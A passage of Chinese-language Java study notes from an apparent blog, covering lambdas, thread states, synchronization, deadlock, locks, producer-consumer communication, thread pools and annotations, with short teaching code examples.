<li>真实对象和代理对象都要实现一个接口；</li>
<li>代理对象要代理真实角色。</li>
</ul>
</li>
<li>好处<ul>
<li>代理对象可以做很多真实对象做不了的事情；</li>
<li>真实对象专注做自己的事。</li>
</ul>
</li>
</ul>
<h4 id="3-Lambda表达式"><a href="#3-Lambda表达式" class="headerlink" title="3.Lambda表达式"></a>3.Lambda表达式</h4><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-06/bfe245ecd11b4f7efae76acd496e5dfb--4306--image-20241006134641276.png" alt="image-20241006134641276"></p>
<ul>
<li>λ 希腊字母表中排序第十一位的字母，英语名称为 Lambda；</li>
<li>避免匿名内部类定义过多；</li>
<li>其实质属于函数式编程的概念；</li>
<li>去掉了一堆没有意义的代码,只留下核心逻辑。</li>
</ul>
<blockquote>
<ul>
<li><p>(params)-&gt; expression[表达式]</p>
</li>
<li><p>(params) -&gt; statement[语句]</p>
</li>
<li><p>(params)-&gt; {statements}</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">a -&gt; System.out.println(<span class="string">&quot;i like lamda--&gt;&quot;</span>+a)</span><br></pre></td></tr></table></figure>
</blockquote>
<ul>
<li>new Thread (()-&gt;System.out.println(“多线程学习。。。。”)).start()；</li>
<li>理解Functional Interface (函数式接口) 是学习Java 8 lambda表达式的关键</li>
</ul>
<blockquote>
<p>函数式接口的定义</p>
</blockquote>
<ul>
<li>任何接口，如果只包含唯一一个抽象方法，那么它就是一个函数式接口。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>对于函数式接口，我们可以通过Lambda表达式来创建该接口的对象。</li>
</ul>
<h3 id="2、线程状态"><a href="#2、线程状态" class="headerlink" title="2、线程状态"></a>2、线程状态</h3><h4 id="1-、线程的五大状态"><a href="#1-、线程的五大状态" class="headerlink" title="1 、线程的五大状态"></a>1 、线程的五大状态</h4><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-06/6aa70bdff9b7d0ccaab0fcbf9e43512a--8967--image-20241006142241243.png" alt="image-20241006142241243"></p>
<h4 id="2、线程方法"><a href="#2、线程方法" class="headerlink" title="2、线程方法"></a>2、线程方法</h4><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-06/93e398a6d304d22f3e9508b65e5d7db1--1d19--image-20241006142255177.png" alt="image-20241006142255177"></p>
<blockquote>
<p>停止线程</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-06/d789e0d2559d4467d10b7795d4a0f0b5--118e--image-20241006142311833.png" alt="image-20241006142311833"></p>
<blockquote>
<p>线程休眠</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-06/9b372cb18be71db388e8ce1c20f00bb7--45cf--image-20241006142329579.png" alt="image-20241006142329579"></p>
<blockquote>
<p>线程礼让</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-06/3c5e2afce39776a9856aa0325ae2015b--8dfd--image-20241006142802266.png" alt="image-20241006142802266"></p>
<blockquote>
<p>线程插队</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-06/a22edb7010caa4d6da813af49a570d10--683b--image-20241006142815613.png" alt="image-20241006142815613"></p>
<h4 id="3-线程状态观测"><a href="#3-线程状态观测" class="headerlink" title="3.线程状态观测"></a>3.线程状态观测</h4><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-06/4558c3a3bcf24243d562cb6f6bc4fb81--e402--image-20241006142842061.png" alt="image-20241006142842061"></p>
<h4 id="4、线程优先级"><a href="#4、线程优先级" class="headerlink" title="4、线程优先级"></a>4、线程优先级</h4><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-06/6f685bd89884419530aaba4167ddb2a0--365d--image-20241006142859222.png" alt="image-20241006142859222"></p>
<h4 id="5、守护线程"><a href="#5、守护线程" class="headerlink" title="5、守护线程"></a>5、守护线程</h4><ul>
<li>线程分为<strong>用户线程</strong>和<strong>守护线程</strong>；</li>
<li>虚拟机必须确保用户线程执行完毕；</li>
<li>虚拟机不用等待守护线程执行完毕；</li>
<li>如，后台记录操作日志，监控内存垃圾回收等待……</li>
</ul>
<h3 id="3、线程同步"><a href="#3、线程同步" class="headerlink" title="3、线程同步"></a>3、线程同步</h3><h4 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1.介绍"></a>1.介绍</h4><ul>
<li>**多个线程操作同一个资源 **</li>
<li>并发：同一个对象被多个线程同时操作</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-06/d0acde08a8674b45418842b7d10eae38--d0c8--image-20241006143301494.png" alt="image-20241006143301494"></p>
<blockquote>
<p>线程同步：</p>
<ul>
<li>现实生活中我们会遇到“同—个资源，多个人都想使用”的问题，比如食堂排队打饭，每个人都想吃饭，最天然的解決办法就是：排队，一个个来。</li>
<li>处理多线程问题时，多个线程访问同一个对象，并且某些线程还想修改这个对象这时候我们就需要线程同步。线程同步其实就是一种等待机制，多个需要同时访问此对象的线程进入这个&#x3D;&#x3D;对象的等待池形&#x3D;&#x3D;成队列，等待前面线程使用完毕，下一个线程再使用。</li>
</ul>
</blockquote>
<ul>
<li>队列和锁</li>
</ul>
<blockquote>
<p>线程同步：</p>
<ul>
<li>由于同一进程的多个线程共享同一块存储空间，在带来方便的同时，也带来了访问冲突问题，为了保证数据在方法中被访问时的正确性，在访问时加入锁机制synchronized，当一个线程获得对象的排它锁，独占资源，其他线程必须等待使用后释放锁即可。存在以下问题：<ul>
<li>一个线程持有锁会导致其他所有需要此锁的线程挂起；</li>
<li>在多线程竞争下，加锁，释放锁会导致比较多的上下文切换和调度延时，引起性能问题；</li>
<li>如果一个优先级高的线程等待个优先级低的线程释放锁会导致优先级倒置，引起性能问题。</li>
</ul>
</li>
</ul>
</blockquote>
<h4 id="2、同步方法"><a href="#2、同步方法" class="headerlink" title="2、同步方法"></a>2、同步方法</h4><ul>
<li>由于我们可以通过 private关键字来保证数据对象只能被方法访问，所以我们只需要针对方法提岀一套机制，这套机制就是syη chronized关键字，它包括两种用法synchronized方法和 synchronized块。<ul>
<li>同步方法：public synchronized void method (int args) {}</li>
</ul>
</li>
<li>synchronized方法控制对“对象”的访问，每个对象对应一把锁，每个synchronized方法都必须获得调用该方法的对象的锁才能执行，否则线程会阻塞，方法一旦执行，就独占该锁，直到该方法返回才释放锁，后面被阻塞的线程才能获得这个锁，继续执行。<ul>
<li>缺陷：若将一个大的方法申明为 synchronized将会影响效率。</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SynDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">BuyTicket</span> <span class="variable">buyTicket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BuyTicket</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(buyTicket, <span class="string">&quot;张三&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(buyTicket, <span class="string">&quot;李四&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(buyTicket, <span class="string">&quot;王五&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BuyTicket</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="comment">// 票</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">ticketNums</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (flag) &#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                buy();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 买票</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">buy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (ticketNums &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            flag = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">1</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (InterruptedException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">&quot;拿到&quot;</span> + ticketNums--);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>加锁前：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-06/97851aa1659b6455ef2896b6e007843a--7088--image-20241006145802193.png" alt="image-20241006145802193"></p>
<p>加锁后：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-06/2408cff000b434b3d05db3cbd12bdd9b--312f--image-20241006145827201.png" alt="image-20241006145827201"></p>
<h4 id="3-同步块"><a href="#3-同步块" class="headerlink" title="3.同步块"></a>3.同步块</h4><ul>
<li>同步块：synchronized (Obj) {}</li>
<li>obj称之为同步监视器<ul>
<li>Obj可以是任何对象，但是推存使用共享资源作为同步监视器。</li>
<li>同步方法中无需指定同步监视器，因为同步方法的同步监视器就是this，就是这个对象本身，或者是class。</li>
</ul>
</li>
<li>同步监视器的执行过程：<ul>
<li>1.第一个线程访问，锁定同步监视器，执行其中代码；</li>
<li>2.第二个线程访问，发现同步监视器被锁定，无法访问；</li>
<li>3.第一个线程访问完毕，解锁同步监视器；</li>
<li>4.第二个线程访问，发现同步监视器没有锁，然后锁定并访问。</li>
</ul>
</li>
</ul>
<p><strong>锁的对象就是变量的量,需要增删改查的对象</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SynDemo2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Account</span> <span class="variable">account</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Account</span>(<span class="number">100</span>, <span class="string">&quot;养老基金&quot;</span>);</span><br><span class="line">        <span class="type">Drawing</span> <span class="variable">drawing</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Drawing</span>(account, <span class="number">60</span>, <span class="string">&quot;夸克&quot;</span>);</span><br><span class="line">        <span class="type">Drawing</span> <span class="variable">drawing2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Drawing</span>(account, <span class="number">100</span>, <span class="string">&quot;1111&quot;</span>);</span><br><span class="line">        <span class="type">Drawing</span> <span class="variable">same</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Drawing</span>(account, <span class="number">120</span>, <span class="string">&quot;same&quot;</span>);</span><br><span class="line">        drawing.start();</span><br><span class="line">        drawing2.start();</span><br><span class="line">        same.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Account</span>&#123;</span><br><span class="line">    <span class="type">int</span> money;  <span class="comment">// 余额</span></span><br><span class="line">    String cardName;    <span class="comment">// 卡名</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Account</span><span class="params">(<span class="type">int</span> money, String cardName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.money = money;</span><br><span class="line">        <span class="built_in">this</span>.cardName = cardName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Drawing</span> <span class="keyword">extends</span> <span class="title class_">Thread</span>&#123;</span><br><span class="line">    Account account;    <span class="comment">// 账户</span></span><br><span class="line">    <span class="type">int</span> drawingMoney;   <span class="comment">// 取余额</span></span><br><span class="line">    <span class="type">int</span> nowMoney;   <span class="comment">// 个人手里的钱</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Drawing</span><span class="params">(Account account, <span class="type">int</span> drawingMoney, String name)</span> &#123;</span><br><span class="line">        <span class="comment">// super(name) =  父类构造方法(name)</span></span><br><span class="line">        <span class="built_in">super</span>(name);</span><br><span class="line">        <span class="built_in">this</span>.account = account;</span><br><span class="line">        <span class="built_in">this</span>.drawingMoney = drawingMoney;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 取钱</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 锁的对象就是变量的量,需要增删改查的对象</span></span><br><span class="line">        <span class="keyword">synchronized</span> (account) &#123;</span><br><span class="line">            <span class="comment">// 判断是否有钱</span></span><br><span class="line">            <span class="keyword">if</span> (account.money - drawingMoney &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;余额不足,不能进行取钱&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>); <span class="comment">// 放大问题的发生性</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 卡内金额 = 余额 - 个人手里的钱</span></span><br><span class="line">            account.money = account.money - drawingMoney;</span><br><span class="line">            <span class="comment">// 个人手里的钱</span></span><br><span class="line">            nowMoney = nowMoney + drawingMoney;</span><br><span class="line">            System.out.println(account.cardName + <span class="string">&quot;余额为:&quot;</span> + account.money);</span><br><span class="line">            <span class="comment">// this.getName()==Thread.currentThread().getName()</span></span><br><span class="line">            System.out.println(<span class="built_in">this</span>.getName() + <span class="string">&quot;手里的钱:&quot;</span> + nowMoney);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4-死锁"><a href="#4-死锁" class="headerlink" title="4.死锁"></a>4.死锁</h4><ul>
<li>多个线程各自占有一些共享资源，并且互相等待其他线程占有的资源才能运行，而导致两个或者多个线程都在等待对方释放资源，都停止执行的情形。某一个同步块同时拥有“两个以上对象的锁”时，就可能会发生“死锁”的问题。</li>
</ul>
<blockquote>
<p>死锁:多个线程互相抱着对方需要的资源,然后形成僵持</p>
<p>解决:一个锁只锁一个对象</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeadLockDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Makeup</span> <span class="variable">makeup</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Makeup</span>(<span class="number">0</span>, <span class="string">&quot;黄焖鸡&quot;</span>);</span><br><span class="line">        <span class="type">Makeup</span> <span class="variable">makeup1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Makeup</span>(<span class="number">1</span>, <span class="string">&quot;牛肉土豆粉&quot;</span>);</span><br><span class="line"></span><br><span class="line">        makeup.start();</span><br><span class="line">        makeup1.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 鸭脖</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DuckNeck</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 土豆粉</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PotatoPowder</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Makeup</span> <span class="keyword">extends</span> <span class="title class_">Thread</span>&#123;</span><br><span class="line">    <span class="comment">// 需要的资源只有一份,用static保证只有一份</span></span><br><span class="line">    <span class="keyword">static</span> <span class="type">DuckNeck</span> <span class="variable">duckneck</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DuckNeck</span>();</span><br><span class="line">    <span class="keyword">static</span> <span class="type">PotatoPowder</span> <span class="variable">potatoPowder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PotatoPowder</span>();</span><br><span class="line">    <span class="type">int</span> choice; <span class="comment">// 选择</span></span><br><span class="line">    String foodName;    <span class="comment">// 食品名称</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Makeup</span><span class="params">(<span class="type">int</span> choice, String foodName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.choice = choice;</span><br><span class="line">        <span class="built_in">this</span>.foodName = foodName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 美食</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            food();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">food</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException&#123;</span><br><span class="line">        <span class="keyword">if</span>(choice == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (duckneck) &#123;    <span class="comment">// 获得鸭脖的锁</span></span><br><span class="line">                System.out.println(<span class="built_in">this</span>.foodName + <span class="string">&quot;获得鸭脖的锁&quot;</span>);</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">synchronized</span> (potatoPowder)&#123;    <span class="comment">// 一秒后想获得 土豆粉的锁</span></span><br><span class="line">                System.out.println(<span class="built_in">this</span>.foodName + <span class="string">&quot;获得土豆粉的锁&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (duckneck) &#123;    <span class="comment">// 获得鸭脖的锁</span></span><br><span class="line">                System.out.println(<span class="built_in">this</span>.foodName + <span class="string">&quot;获得鸭脖的锁&quot;</span>);</span><br><span class="line">                Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">synchronized</span> (potatoPowder)&#123;    <span class="comment">// 一秒后想获得 土豆粉的锁</span></span><br><span class="line">                System.out.println(<span class="built_in">this</span>.foodName + <span class="string">&quot;获得土豆粉的锁&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>避免死锁的办法</p>
</blockquote>
<ul>
<li>产生死锁的四个必要条件<ul>
<li>1.互斥条件：一个资源毎次只能被一个进程使用。</li>
<li>2.请求与保持条件：一个进程因请求资源而阻塞时，对已获得的资源保持不放。</li>
<li>3.不剥夺条件∶进程已获得的资源，在末使用完之前，不能强行剥夺。</li>
<li>4.循环等待条件：若干进程之间形成一种头尾相接的循环等待资源关系。</li>
</ul>
</li>
<li>上面列出了死锁的四个必要条件，我们只要想办法破其中的任意一个或多个条件就可以避免死锁发生。</li>
</ul>
<h4 id="5、Lock（锁）"><a href="#5、Lock（锁）" class="headerlink" title="5、Lock（锁）"></a>5、Lock（锁）</h4><ul>
<li>从JDK 5.0开始, Java提供了更强大的线程同步机制一通过显式定义同步锁对象来实现同步。同步锁使用Lock对象充当。</li>
<li>java.util.concurrent.locks.Lock接口是控制多个线程对共享资源进行访问的工具。锁提供了对共享资源的独占访问，每次只能有一个线程对Lock对象加锁，线程开始访问共享资源之前应先获得Lock对象。</li>
<li>ReentrantLock 类实现了 Lock，它拥有与 synchronized 相同的并发性和内存语义，在实现线程安全的控制中，比较常用的是ReentrantLock, 可以显式加锁、释放锁。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Reentrantlock lock <span class="keyword">new</span> <span class="title class_">Reen</span> TrantLock();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">m</span><span class="params">()</span>&#123;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">// 保证线程安全的代码</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">finally</span>&#123;</span><br><span class="line">            lock.unlock();	<span class="comment">// 如果同步代码有异常，要将unlock()写入finally语句块</span></span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h4 id="6-synchroized与Lock对比"><a href="#6-synchroized与Lock对比" class="headerlink" title="6.synchroized与Lock对比"></a>6.synchroized与Lock对比</h4><ul>
<li>Lock是显式锁 (手动开启和关闭锁，别忘记关闭锁) synchronized是隐式锁, 出了作用域自动释放。</li>
<li>Lock只有代码块锁, synchronized有代码块锁和方法锁。</li>
<li>使用Lock锁，JVM将花费较少的时间来调度线程, 性能更好。并且具有更好的扩展性 (提供更多的子类)。</li>
<li>优先使用顺序:<ul>
<li>Lock &gt; 同步代码块 (已经进入了方法体，分配了相应资源 $)&gt;$ 同步方法 (在方法体之外)</li>
</ul>
</li>
</ul>
<h3 id="4-线程通信问题"><a href="#4-线程通信问题" class="headerlink" title="4.线程通信问题"></a>4.线程通信问题</h3><ul>
<li>应用场景 : 生产者和消费者问题<ul>
<li>假设仓库中只能存放一件产品 , 生产者将生产出来的产品放入仓库，消费者将仓库中产品取走消费。</li>
<li>如果仓库中没有产品 , 则生产者将产品放入仓库，否则停止生产并等待，直到仓库中的产品被消费者取走为止。</li>
<li>如果仓库中放有产品 , 则消费者可以将产品取走消费，否则停止消费并等待，直到仓库中再次放入产品为止。</li>
</ul>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-06/76a92767801a37f6cc81d492e28bb998--6b68--image-20241006152941896.png" alt="image-20241006152941896"></p>
<h4 id="1-线程通信方法"><a href="#1-线程通信方法" class="headerlink" title="1.线程通信方法"></a>1.线程通信方法</h4><ul>
<li>Java提供了几个方法解决线程之间的通信问题。</li>
</ul>
<table>
<thead>
<tr>
<th align="center">方法名</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">wait()</td>
<td>表示线程一直等待，直到其他线程通知，与sleep不同会释放锁。</td>
</tr>
<tr>
<td align="center">wait(long timeout)</td>
<td>指定等待的毫秒数。</td>
</tr>
<tr>
<td align="center">notify()</td>
<td>唤醒一个处于等待状态的线程。</td>
</tr>
<tr>
<td align="center">notifyAll()</td>
<td>唤醒同一个对象上所有调用wait()方法的线程，优先级别高的线程优先调度。</td>
</tr>
</tbody></table>
<ul>
<li>注意：均是 Object类的方法，都只能在同步方法或者同步代码块中使用，否则会抛出异常IIIegalMonitorStateException。</li>
<li>这是一个线程同步问题，生产者和消费者共享同一个资源，并且生产者和消费者之间相互依赖，互为条件：<ul>
<li>对于生产者，没有生产产品之前，要通知消费者等待。而生产了产品之后，又需要马上通知消费者消费。</li>
<li>对于消费者，在消费之后，要通知生产者已经结束消费，需要生产新的产品以供消费。</li>
<li>在生产者消费者问题中，仅有 synchronized是不够的：<ul>
<li>synchronized可阻止并发更新同一个共享资源，实现了同步；</li>
<li>synchronized不能用来实现不同线程之间的消息传递通信。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="2-线程通信问题解决方式"><a href="#2-线程通信问题解决方式" class="headerlink" title="2.线程通信问题解决方式"></a>2.线程通信问题解决方式</h4><blockquote>
<p>解决方式一：</p>
<ul>
<li>并发协作模型“生产者&#x2F;消费者模式”–&gt;管程法：<ul>
<li>生产者∶负责生产数据的模块（可能是方法，对象，线程，进程）；</li>
<li>消费者：负责处理数据的模块（可能是方法，对象，线程，进程）；</li>
<li>缓冲区：消费者不能直接使用生产者的数据，他们之间有个“缓冲区”。</li>
</ul>
</li>
<li>生产者将生产好的数据放入缓冲区，消费者从缓冲区拿出数据。</li>
</ul>
</blockquote>
<h3 id="5-线程池"><a href="#5-线程池" class="headerlink" title="5.线程池"></a>5.线程池</h3><ul>
<li>背景：经常创建和销毁、使用量特别大的资源，比如并发情况下的线程，对性能影响很大。</li>
<li>思路：提前创建好多个线程，放入线程池中，使用时直接获取，使用完放回池中。可以避免频繁创建销毁、实现重复利用。类似生活中的公共交通工具。</li>
<li>好处：<ul>
<li>提高响应速度（减少了创建新线程的时间）；</li>
<li>降低资源消耗（重复利用线程池中线程，不需要毎次都创建）；</li>
<li>便于线程管理（…）<ul>
<li>corePoolsize：核心池的大小；</li>
<li>maximumPoolSize：最大线程数；</li>
<li>keepAliveTime：线程没有任务时最多保持多长时间后会终止。</li>
</ul>
</li>
</ul>
</li>
<li>JDK 5.0起提供了线程池相关AP:ExecutorService和 Executors。</li>
<li>ExecutorService：真正的线程池接口。常见子类 ThreadPoolExecutor。<ul>
<li>void execute（ Runnable command）：执行任务命令，没有返回值，一般用来执行 Runnable；</li>
<li><T> Future<T> submit（ Callable<T>妇ask）：执行任务，有返回值，一般又来执行Callable；</li>
<li>void shutdown（）：关闭连接池。</li>
</ul>
</li>
<li>Executors：工具类、线程池的工厂类，用于创建并返回不同类型的线程池。</li>
</ul>
<blockquote>
<p>多线程还得看JUC，后边也还会再记录的</p>
</blockquote>
<h2 id="注解与反射"><a href="#注解与反射" class="headerlink" title="注解与反射"></a>注解与反射</h2><p>注解使用的更多的是在后边的spring、springboot的框架中，会大量使用到各种注解。</p>
<h3 id="1、注解"><a href="#1、注解" class="headerlink" title="1、注解"></a>1、注解</h3><h4 id="1、注解入门"><a href="#1、注解入门" class="headerlink" title="1、注解入门"></a>1、注解入门</h4><ul>
<li><p>Annotation是jdk1.5开始引入的新技术。</p>
</li>
<li><p>Annotation的作用：</p>
<ul>
<li>不是程序本身，可以对程序作出解释；</li>
<li>可以被其他程序（例如编译器）读取。</li>
</ul>
</li>
<li><p>Annotation的格式</p>
<ul>
<li>“@注解名”，也可以带参数，例如：@SuppressWarnings(value&#x3D;“unchcked”)</li>
</ul>
</li>
<li><p>Annotation在哪里使用？</p>
<ul>
<li>可以附加在package、class、method、field上，相当于给它们添加了额外的辅助信息，还可以通过反射机制编程实现对这些元数据的访问。</li>
</ul>
</li>
</ul>
<h4 id="2-内置注解"><a href="#2-内置注解" class="headerlink" title="2.内置注解"></a>2.内置注解</h4><ul>
<li>@ Override：定义在 java. lang Override中，此注释只适用于修辞方法，表示一个方法声明打算重写超类中的另一个方法声明。</li>
<li>@ Deprecated：定义在 Java. lang. Deprecated中，此注释可以用于修辞方法，属性，类，表示不鼓励程序员使用这样的元素，通常是因为它很危险或者存在更好的选择。</li>
<li>@ SuppressWarnings：定义在 Java. lang. SuppressWarnings中，用来抑制编译时的警告信息。</li>
<li>与前两个注释有所不同，你需要添加一个参数才能正确使用，这些参数都是已经定义好了的，我们选择性的使用就好了。<ul>
<li>@SuppressWarnings （ “all”）</li>
<li>@SuppressWarnings （unchecked”）</li>
<li>@ SuppressWarnings（value&#x3D;f”unchecked”， “ deprecation “）</li>
<li>等等……</li>
</ul>
</li>
</ul>
<h4 id="3、自定义注解"><a href="#3、自定义注解" class="headerlink" title="3、自定义注解"></a>3、自定义注解</h4><ul>
<li>元注解的作用就是负责注解其他注解，Java定叉了4个标准的meta- annotation类型，他们被用来提供对其他 annotation类型作说明。</li>
<li>这些类型和它们所支持的类在 java. lang annotation包中可以找到。（@Target，@Retention，@Documented, @Inherited）<ul>
<li>@ Target：用于描述注解的使用范围（即被描述的注解可以用在什么地方）。</li>
<li>@ Retention：表示需要在什么级别保存该注释信息，用于描述注解的生命周期。<ul>
<li>SOURCE &lt; CLASS &lt; RUNTIME</li>
</ul>
</li>
<li>@ Document：说明该注解将被包含在 Javadoc中。</li>
<li>@ Inherited：说明子类可以继承父类中的该注解。</li>
</ul>
</li>
</ul>
<blockquote>
